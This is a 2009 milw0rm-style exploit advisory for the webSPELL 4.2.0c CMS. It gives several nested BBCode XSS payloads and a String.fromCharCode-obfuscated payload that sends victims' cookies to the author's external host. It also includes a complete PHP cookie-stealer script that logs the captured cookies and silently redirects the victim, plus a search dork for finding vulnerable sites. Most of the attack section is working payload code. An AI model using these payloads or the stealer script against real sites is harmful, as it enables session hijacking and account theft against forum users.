<html><head><title>webSPELL 4.2.0c Bypass BBCode XSS Cookie Stealing Vulnerability</title></head><pre>***********************************************************************************************
***********************************************************************************************
**	       										     **
**  											     **
**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
**     || || ||  []        [][]   []   []  []     []   []      [] []   []	 []    []    **
** [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    **
**							                                     **
**    											     **
**                          ¡VIVA SPAIN!...¡GANAREMOS EL MUNDIAL!...o.O                      **
**					PROUD TO BE SPANISH!				     **
**											     **
***********************************************************************************************
***********************************************************************************************

----------------------------------------------------------------------------------------------
|       	   XSS (BYPASS BBCODE) COOKIES STEALING VULNERABILITY                        |
|--------------------------------------------------------------------------------------------|
|                         	     | webSPELL 4.2.0c |		 		     |
|  CMS INFORMATION:		      ----------------					     |
|											     |
|--&gt;WEB: http://www.webspell.org/ (affected too)				   	     |
|--&gt;DOWNLOAD: http://www.webspell.org/download.php?fileID=22	   			     |
|--&gt;DEMO: http://www.webspell.org/index.php?site=demo					     |
|--&gt;CATEGORY: CMS / Portals								     |
|--&gt;DESCRIPTION: webSPELL is a free Content Management System (CMS) for clans and 	     |
|   gaming communities, providing all needed features like forums, gallery, clanwar...	     |
|                                                                                            |
|   CMS VULNERABILITY:									     |
|											     |
|--&gt;TESTED ON: firefox 3.0.8 and IE 6.0.29 (Default)					     |
|--&gt;DORK: &quot;Powered by webSPELL&quot;								     |
|--&gt;CATEGORY: XSS/BYPASS-BBCODE/COOKIES STEALING					     |
|--&gt;AFFECT VERSION: LAST = 4.2.0C (maybe &lt;= ?)						     |
|--&gt;Discovered Bug date: 2009-04-14							     |
|--&gt;Reported Bug date: 2009-04-14							     |
|--&gt;Fixed bug date: 2009-04-14								     |
|--&gt;Info patch (v-4.2.0d): http://www.webspell.org/					     |
|--&gt;Author: YEnH4ckEr									     |
|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
|--&gt;WEB/BLOG: N/A									     |
|--&gt;COMMENT: A mi novia Marijose...hermano,cuñada, padres (y amigos xD) por su apoyo.        |
----------------------------------------------------------------------------------------------


-----------
BUG ZONES:
-----------

#BBCode is bypassed by differents methods and XSS is possible.

----------------------------------
PROOF OF CONCEPT (SEARCHING XSS):
----------------------------------

BOTH (FIREFOX AND IE):


[email][img]http://a.com onmouseover=alert(1) [/img][/email]
[email][email][img]http://a.com onmouseover=alert(1) [/img] [/email][/email]
[email][url][img]http://a.com onmouseover=alert(1) [/img] [/url][/email]

Maybe you find more...I looked for a bit xD

ONLY IE:

[email][email][url]http://a.com onmouseover=alert(1) [/url]http://' onmouseover=alert(1) [/email][/email]
[email][email][url]http://a.com' onmouseover=alert(1) [/url]http:// onmouseover=alert(1) [/email][/email]
[email][email][url]http://a.com' onmouseover=alert(1) [/url]http:// ' onmouseover=alert(1) [/email][/email]
[email][email][url]http://a.com' onmouseover=alert(1) [/url] ' onmouseover=alert(1) [/email][/email]
[email][email][url]http://a.com onmouseover=alert(1) [/url] ' onmouseover=alert(1) [/email][/email]

Note:Space between &quot;(1)&quot; and &quot;[/img]&quot; sometimes is necessary...

Combinations of tags like this: 

[email][img]http://a.com onmouseover=alert(1) [/img][/email]

Generate the follow html code:

&lt;a href=&quot;mailto:...&quot;&gt;&lt;img src=\&quot;http://a.com onmouseover=alert(1) \&quot; id=\&quot;ws_image_123966998343_1\&quot; border=\&quot;0\&quot; onload=\&quot;checkSize('123966998343_1', 450, 500)\&quot; alt=\&quot;http://a.com onmouseover=alert(1) \&quot; style=\&quot;max-width: 451px; max-height: 501px;\&quot; /&gt;&lt;div id=\&quot;ws_imagediv_123966998343_1\&quot; style=\&quot;display:none;\&quot;&gt;&lt;a href='http://a.com onmouseover=alert(1) ' target='_blank'&gt;&lt;i&gt;(Auto resize: show original)&lt;/i&gt;&lt;/a&gt;&lt;/div&gt;&lt;/a&gt;


--------------------------
COOKIES EXPLOIT (BBCODE):
--------------------------

I'll use the first PoC (IE6 and firefox) and String.fromCharCode 
to bypass quotes and send cookies to my host:

http://www.myphpcookiestealing.es/capturethecookies.php?ck=

Well...Let's GO!

[email][img]http://www.victim.es onmouseover=document.location=String.fromCharCode(104,116,116,112,58,47,47,119,119,119,46,109,121,112,104,112,99,111,111,107,105,101,115,116,101,97,108,105,110,103,46,101,115,47,99,97,112,116,117,114,101,116,104,101,99,111,111,107,105,101,115,46,112,104,112,63,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,61)+document.cookie [/img][/email]

------------------------------
COOKIES STEALER (PHP SCRIPT):
------------------------------

&lt;?php
$ck=$_GET[&quot;ck&quot;]; //Capture the cookies	 
$manejador=fopen(&quot;exploited.txt&quot;,'a'); //Open cookies saved file
fwrite($manejador, &quot;Cookie:\r\n&quot;.htmlentities($ck).&quot;\r\n--EOF--\r\n&quot;); //Save the values
fclose($manejador);	//Close file
echo &quot;&lt;script&gt;location.href='http://[HOST]/[PATH]/index.php?module';&lt;/script&gt;&quot;; //Redirect...we don't want to alert xDD
?&gt;

You can use any cookie editor and you have one nice shot (XSSSHEll+XSSTunnel = many nice shots xD)

*******************************************************************
 ESPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!
*******************************************************************

-------------------EOF----------------------------------&gt;&gt;&gt;ENJOY IT!

# milw0rm.com [2009-04-16]</pre></html>